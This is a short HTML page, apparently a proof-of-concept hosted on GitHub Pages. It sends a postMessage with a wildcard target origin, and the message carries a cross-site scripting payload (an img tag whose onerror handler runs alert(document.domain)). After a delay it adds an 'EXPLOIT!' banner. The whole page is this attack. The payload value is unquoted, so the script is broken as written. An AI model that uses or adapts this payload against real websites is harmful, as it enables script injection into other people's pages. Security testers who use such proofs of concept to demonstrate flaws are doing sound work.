# testing.github.io
<!DOCTYPE html>
<html>
<body>
<script>
window.postMessage({
    type: "SET",
    replacementString: <img src=x onerror=alert(document.domain)>
}, "*");
setTimeout(function() {
    document.body.innerHTML += '<marquee>EXPLOIT!</marquee>';
}, 500);
</script>
</body>
</html>
